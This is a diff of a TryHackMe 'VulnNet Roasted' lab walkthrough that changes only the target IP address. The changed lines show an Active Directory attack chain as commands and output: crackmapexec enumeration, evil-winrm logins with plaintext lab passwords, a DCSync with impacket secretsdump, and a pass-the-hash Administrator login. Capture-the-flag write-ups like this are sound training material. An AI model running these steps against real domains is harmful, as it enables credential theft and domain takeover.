@@ -292,7 +292,7 @@ Crackmapexec says (Pwn3d!) for WINRM, we can login via EvilWinRM to the box.
 
 ```shell
 ┌──(sid㉿kali)-[~/pentest/tryhackme/vulnNet-roasted]
-└─$ evil-winrm -i 10.10.126.112 -u enterprise-core-vn -p 'ry=ibfkfv,s6h,'
+└─$ evil-winrm -i 10.10.171.0 -u enterprise-core-vn -p 'ry=ibfkfv,s6h,'
 
 Evil-WinRM shell v2.4
 
@@ -311,25 +311,25 @@ We find that we have read access to the NETLOGON and SYSVOL smb shares with cred
 
 ```shell
 ┌──(sid㉿kali)-[~/pentest/tryhackme/vulnNet-roasted]
-└─$ crackmapexec smb 10.10.126.112 --shares -u enterprise-core-vn -p 'ry=ibfkfv,s6h,'
-SMB         10.10.126.112   445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
-SMB         10.10.126.112   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\enterprise-core-vn:ry=ibfkfv,s6h, 
-SMB         10.10.126.112   445    WIN-2BO8M1OE1M1  [+] Enumerated shares
-SMB         10.10.126.112   445    WIN-2BO8M1OE1M1  Share           Permissions     Remark
-SMB         10.10.126.112   445    WIN-2BO8M1OE1M1  -----           -----------     ------
-SMB         10.10.126.112   445    WIN-2BO8M1OE1M1  ADMIN$                          Remote Admin
-SMB         10.10.126.112   445    WIN-2BO8M1OE1M1  C$                              Default share
-SMB         10.10.126.112   445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC
-SMB         10.10.126.112   445    WIN-2BO8M1OE1M1  NETLOGON        READ            Logon server share 
-SMB         10.10.126.112   445    WIN-2BO8M1OE1M1  SYSVOL          READ            Logon server share 
-SMB         10.10.126.112   445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ    VulnNet Business Sharing
-SMB         10.10.126.112   445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ  VulnNet Enterprise Sharing 
+└─$ crackmapexec smb 10.10.171.0 --shares -u enterprise-core-vn -p 'ry=ibfkfv,s6h,'
+SMB         10.10.171.0   445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
+SMB         10.10.171.0   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\enterprise-core-vn:ry=ibfkfv,s6h, 
+SMB         10.10.171.0   445    WIN-2BO8M1OE1M1  [+] Enumerated shares
+SMB         10.10.171.0   445    WIN-2BO8M1OE1M1  Share           Permissions     Remark
+SMB         10.10.171.0   445    WIN-2BO8M1OE1M1  -----           -----------     ------
+SMB         10.10.171.0   445    WIN-2BO8M1OE1M1  ADMIN$                          Remote Admin
+SMB         10.10.171.0   445    WIN-2BO8M1OE1M1  C$                              Default share
+SMB         10.10.171.0   445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC
+SMB         10.10.171.0   445    WIN-2BO8M1OE1M1  NETLOGON        READ            Logon server share 
+SMB         10.10.171.0   445    WIN-2BO8M1OE1M1  SYSVOL          READ            Logon server share 
+SMB         10.10.171.0   445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ    VulnNet Business Sharing
+SMB         10.10.171.0   445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ  VulnNet Enterprise Sharing 
 
 ```
 
 ```shell
 ┌──(sid㉿kali)-[~/pentest/tryhackme/vulnNet-roasted]
-└─$ smbclient -U enterprise-core-vn  //10.10.126.112/NETLOGON
+└─$ smbclient -U enterprise-core-vn  //10.10.171.0/NETLOGON
 Enter WORKGROUP\enterprise-core-vn's password: 
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -374,12 +374,12 @@ We find credentials hardcoded in a visual basic script a-whithat:bNdKVkjv3RR9ht
 
 ```shell
 ┌──(sid㉿kali)-[~/pentest/tryhackme/vulnNet-roasted]
-└─$ crackmapexec winrm -u a-whitehat -p bNdKVkjv3RR9ht -x whoami 10.10.126.112
-WINRM       10.10.126.112   5985   WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local)
-WINRM       10.10.126.112   5985   WIN-2BO8M1OE1M1  [*] http://10.10.126.112:5985/wsman
-WINRM       10.10.126.112   5985   WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a-whitehat:bNdKVkjv3RR9ht (Pwn3d!)
-WINRM       10.10.126.112   5985   WIN-2BO8M1OE1M1  [+] Executed command
-WINRM       10.10.126.112   5985   WIN-2BO8M1OE1M1  vulnnet-rst\a-whitehat
+└─$ crackmapexec winrm -u a-whitehat -p bNdKVkjv3RR9ht -x whoami 10.10.171.0
+WINRM       10.10.171.0   5985   WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local)
+WINRM       10.10.171.0   5985   WIN-2BO8M1OE1M1  [*] http://10.10.171.0:5985/wsman
+WINRM       10.10.171.0   5985   WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a-whitehat:bNdKVkjv3RR9ht (Pwn3d!)
+WINRM       10.10.171.0   5985   WIN-2BO8M1OE1M1  [+] Executed command
+WINRM       10.10.171.0   5985   WIN-2BO8M1OE1M1  vulnnet-rst\a-whitehat
 
 
 ```
@@ -388,7 +388,7 @@ WINRM       10.10.126.112   5985   WIN-2BO8M1OE1M1  vulnnet-rst\a-whitehat
 
 ```shell
 ┌──(sid㉿kali)-[~/pentest/tryhackme/vulnNet-roasted]
-└─$ evil-winrm -i 10.10.126.112 -u a-whitehat -p bNdKVkjv3RR9ht                                                                      
+└─$ evil-winrm -i 10.10.171.0 -u a-whitehat -p bNdKVkjv3RR9ht                                                                      
                                                                                                                                        
 Evil-WinRM shell v2.4                                                                                                                  
                                                                                                                                        
@@ -422,7 +422,7 @@ The user a-whithat is a domain admin, we can perform a DCSync attack to get the 
 
 ```shell
 ┌──(sid㉿kali)-[~/pentest/tryhackme/vulnNet-roasted]
-└─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py a-whitehat@10.10.126.112
+└─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py a-whitehat@10.10.171.0
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
 Password:
@@ -441,7 +441,7 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 
 ```shell
 ┌──(sid㉿kali)-[~/pentest/tryhackme/vulnNet-roasted]
-└─$ evil-winrm -i 10.10.126.112 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d 
+└─$ evil-winrm -i 10.10.171.0 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d 
 
 Evil-WinRM shell v2.4
 
@@ -458,7 +458,7 @@ Ethernet adapter Ethernet 2:
 
    Connection-specific DNS Suffix  . : eu-west-1.compute.internal
    Link-local IPv6 Address . . . . . : fe80::d4e2:b2ca:aa85:e442%6
-   IPv4 Address. . . . . . . . . . . : 10.10.126.112
+   IPv4 Address. . . . . . . . . . . : 10.10.171.0
    Subnet Mask . . . . . . . . . . . : 255.255.0.0
    Default Gateway . . . . . . . . . : 10.10.0.1
 *Evil-WinRM* PS C:\Users\Administrator\Documents>
